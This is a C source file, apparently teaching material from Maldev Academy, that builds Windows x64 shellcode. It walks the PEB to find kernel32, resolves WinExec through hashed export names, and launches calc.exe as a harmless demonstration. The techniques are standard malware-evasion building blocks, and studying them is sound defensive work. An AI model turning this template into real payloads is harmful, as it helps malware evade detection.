/*! 
 *  Author:      C5pider 
 *  Date:        30.07.2023
 *  Description: simple shellcode that executes calc.ex
 *
 *  Maldev Academy 
 */

#include "shellcode.h"

/* typedef for WinExec function */
typedef UINT WINEXEC (
  _In_ LPCSTR lpCmdLine,
  _In_ UINT   uCmdShow
); 

typedef WINEXEC* PWINEXEC;

/*!
 * NOTE:
 *    this code has been compiled using the 
 *    x64_86 Mingw cross compiler on linux. 
 *    So keep in mind that this might not compile 
 *    under Visual studio. 
 */

/*!
 * @brief
 *  a small stub that aligns the stack
 *  by 16-bytes as specified in the 
 *  official Microsoft documentation.
 *  this part is getting executed first when 
 *  the shellcode is getting invoked.
 */
asm(
  "Start:                         \n"
  " push rsi                      \n"
  " mov  rsi, rsp                 \n"
  " and  rsp, 0xFFFFFFFFFFFFFFF0  \n"
  " sub  rsp, 0x20                \n"
  " call Main                     \n"
  " mov  rsp, rsi                 \n"
  " pop  rsi                      \n"
  " ret                           \n"
);

/*!
* @brief
*   shellcode main function
*
*   it simply executes calc.exe using WinExec
*/
VOID Main() {
  PVOID    Kernel32 = { 0 };
  CHAR     String[] = { 'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', 0 }; // "calc.exe" string
  PWINEXEC pWinExec = NULL;
  
  /* Load Kernel32 from PEB */
  if ( ( Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
    /* resolve the WinExec api */
    if ( ( pWinExec = LdrFunctionAddr( Kernel32, H_API_WINEXEC ) ) ) {
      /* spawn calc.exe */
      pWinExec( String, TRUE );
    }
  } 
}

ULONG HashString(
    _In_ PVOID String,
    _In_ ULONG Length
) {
    ULONG  Hash = { 0 };
    PUCHAR Ptr  = { 0 };
    UCHAR  Char = { 0 };

    Hash = 5381;
    Ptr  = String;

    do {
        Char = *Ptr;

        if ( ! Length ) {
            if ( !*Ptr ) break;
        } else {
            if ( U_PTR( Ptr - U_PTR( String ) ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        /* turn current character to uppercase */
        if ( Char >= 'a' ) {
            Char -= 0x20;
        }

        /* append hash */
        Hash = ( ( Hash << 5 ) + Hash ) + Char;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}

/*!
 * @brief
 *  load module from PEB
 * 
 * @param Hash
 *  hash of module to load
 * 
 * @return
 *  module pointer
 */ 
PVOID LdrModulePeb(
  _In_ ULONG Hash
) {
    PLDR_DATA_TABLE_ENTRY Data  = NULL;
    PLIST_ENTRY           Head  = NULL;
    PLIST_ENTRY           Entry = NULL;

    /* Get pointer to list */
    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    /* iterate over list */
    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        /* Compare the DLL Name! */
        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

/*!
 * @brief
 *  gets the function pointer
 *
 * @param Module
 *  module to resolve function from
 *
 * @param Hash
 *  function hash to resolve
 *
 * @return
 *  function address 
 */
PVOID LdrFunctionAddr(
    _In_ PVOID Module,
    _In_ ULONG Hash
) {
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PCHAR                   FunctionName     = { 0 };

    if ( ! Module || ! Hash ) {
      return NULL;
    }

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
      FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
      if ( HashString( FunctionName, 0 ) == Hash ) {
        return C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
      }
    }

    return NULL;
}
